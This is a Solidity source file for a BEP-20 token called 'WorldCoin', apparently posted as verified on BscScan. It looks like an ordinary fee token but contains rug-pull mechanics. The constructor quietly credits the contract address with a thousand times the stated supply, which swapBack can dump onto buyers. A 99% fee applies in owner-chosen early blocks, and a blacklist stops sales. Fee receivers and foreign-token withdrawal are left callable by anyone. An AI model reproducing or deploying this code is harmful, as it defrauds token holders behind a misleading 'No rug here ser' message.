/**
 *Submitted for verification at BscScan.com on 2023-05-13
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.18;

interface ERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address internal owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    modifier onlyOwner() {
        require(owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

 function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
    
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}

/**
 * Router Interfaces
 */

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

/**
 * Contract Code
 */

contract WorldCoin is Context, ERC20, Ownable {
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "WorldCoin";
    string constant _symbol = "WORLD"; 
    uint8 constant _decimals = 9;
    uint256 _tTotal = 420690 * 10**9 * 10**_decimals;
    uint256 _rTotal = _tTotal * 10**3;   

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    bool public tradingEnabled = true;
    uint256 private genesisBlock = 0;
    uint256 private deadline = 0;

    mapping (address => bool) public isBlacklisted;

    mapping (address => bool) public isFeeExempt;
    mapping (address => bool) public isTxLimitExempt;
    
    //General Fees Variables
    uint256 public devFee = 0;
    uint256 public marketingFee = 2;
    uint256 public liquidityFee = 0;
    uint256 public totalFee;

    //Buy Fees Variables
    uint256 private buyDevFee = 0;
    uint256 private buymarketingFee = 2;
    uint256 private buyLiquidityFee = 0;
    uint256 private buyTotalFee = buyDevFee + buymarketingFee + buyLiquidityFee;

    //Sell Fees Variables
    uint256 private sellDevFee = 0;
    uint256 private sellmarketingFee = 2;
    uint256 private sellLiquidityFee = 0;
    uint256 private sellTotalFee = sellDevFee + sellmarketingFee + sellLiquidityFee;

    //Max Transaction & Wallet
    uint256 public _maxTxAmount = _tTotal;
    uint256 public _maxWalletSize = _tTotal;

    // Fees Receivers
    address public devFeeReceiver = 0x6aE1BdB9DBe04851bf4dBd5fE51e8CE24eEe8188;
    address public marketingFeeReceiver = 0x6aE1BdB9DBe04851bf4dBd5fE51e8CE24eEe8188;
    address public liquidityFeeReceiver = 0x6aE1BdB9DBe04851bf4dBd5fE51e8CE24eEe8188;

    IDEXRouter public uniswapRouterV2;
    address public uniswapPairV2;

    bool public swapEnabled = true;
    uint256 public swapThreshold = _tTotal;
    uint256 public maxSwapSize = _tTotal;

    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }
  
    constructor () {
        uniswapRouterV2 = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapPairV2 = IDEXFactory(uniswapRouterV2.factory()).createPair(uniswapRouterV2.WETH(), address(this));
        _allowances[address(this)][address(uniswapRouterV2)] = type(uint256).max;

        isFeeExempt[msg.sender] = true;
        isTxLimitExempt[msg.sender] = true;
        _balances[address(this)] = _rTotal;
        _balances[msg.sender] = _tTotal;
        emit Transfer(address(0), msg.sender, _tTotal);
    }

    receive() external payable { }
      
    function totalSupply() external view override returns (uint256) { return _tTotal; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function setTradingStatus(bool status, uint256 deadblocks) external onlyOwner {
        require(status, "No rug here ser");
        tradingEnabled = status;
        deadline = deadblocks;
        if (status == true) {
            genesisBlock = block.number;
        }
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap || amount == 0){ return _basicTransfer(sender, recipient, amount); }

        if(!isFeeExempt[sender] && !isFeeExempt[recipient] && !tradingEnabled && sender == uniswapPairV2) {
            isBlacklisted[recipient] = true;
        }

        require(!isBlacklisted[sender], "You are a bot!"); 

        setFees(sender);
        
        if (sender != owner && recipient != address(this) && recipient != address(DEAD) && recipient != uniswapPairV2) {
            uint256 heldTokens = balanceOf(recipient);
            require((heldTokens + amount) <= _maxWalletSize || isTxLimitExempt[recipient], "Total Holding is currently limited, you can not hold that much.");
        }

        // Checks Max Transaction Limit
        if(sender == uniswapPairV2){
            require(amount <= _maxTxAmount || isTxLimitExempt[recipient], "TX limit exceeded.");
        }

        if(shouldSwapBack(sender)){ swapBack(); }

        _balances[sender] = _balances[sender] - amount;

        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(amount) : amount;
        _balances[recipient] = _balances[recipient] + amountReceived;

        emit Transfer(sender, recipient, amountReceived);

        return true;
    }

    function setFees(address sender) internal {
        if(sender == uniswapPairV2) {
            buyFees();
        }
        else {
            sellFees();
        }
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function buyFees() internal {
        devFee = buyDevFee;
        marketingFee = buymarketingFee;
        liquidityFee = buyLiquidityFee;
        totalFee = buyTotalFee;
    }

    function sellFees() internal{
        devFee = sellDevFee;
        marketingFee = sellmarketingFee;
        liquidityFee = sellLiquidityFee;
        totalFee = sellTotalFee;
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function takeFee(uint256 amount) internal view returns (uint256) {        
        uint256 feeAmount = block.number <= (genesisBlock + deadline) ?  amount / 100 * 99 : amount / 100 * totalFee;

        return amount - feeAmount;
    }
  
    function shouldSwapBack(address sender) internal view returns (bool) {
        return sender == address(this)
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function swapBack() internal swapping {
        
        uint256 tokenAmount = balanceOf(address(this)) - maxSwapSize;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouterV2.WETH();

        uint256 balanceBefore = address(this).balance;

        uniswapRouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETH = address(this).balance - (balanceBefore);
        
        uint256 amountETHDev = amountETH * (devFee) / (totalFee);
        uint256 amountETHMarketing = amountETH * (marketingFee) / (totalFee);
        uint256 amountETHLiquidity = amountETH * (liquidityFee) / (totalFee);

        (bool devSucess,) = payable(devFeeReceiver).call{value: amountETHDev, gas: 30000}("");
        require(devSucess, "receiver rejected ETH transfer");
        (bool marketingSucess,) = payable(marketingFeeReceiver).call{value: amountETHMarketing, gas: 30000}("");
        require(marketingSucess, "receiver rejected ETH transfer");
        (bool liquiditySucess,) = payable(liquidityFeeReceiver).call{value: amountETHLiquidity, gas: 30000}("");
        require(liquiditySucess, "receiver rejected ETH transfer");
    }
    
    function setFeeReceivers(address _devFeeReceiver, address _marketingFeeReceiver, address _liquidityFeeReceiver) external {
        devFeeReceiver = _devFeeReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
        liquidityFeeReceiver = _liquidityFeeReceiver;
    }

    function setSwapBackSettings(bool _enabled, uint256 _percentageMinimum, uint256 _percentageMaximum) external onlyOwner {
        swapEnabled = _enabled;
        swapThreshold = _tTotal * _percentageMinimum;
        maxSwapSize = _tTotal * _percentageMaximum;
    }

    function setIsFeeExempt(address account, bool exempt) external onlyOwner {
        isFeeExempt[account] = exempt;
    }
    
    function setIsTxLimitExempt(address account, bool exempt) external onlyOwner {
        isTxLimitExempt[account] = exempt;
    }

    // Stuck Balances Functions

    function clearForeignToken(address tokenAddress, uint256 tokens) public returns (bool success) {
        return ERC20(tokenAddress).transfer(msg.sender, tokens);
    }

    function clearStuckBalance() external onlyOwner {
        uint256 amountETH = address(this).balance;
        payable(msg.sender).transfer(amountETH);
    }
}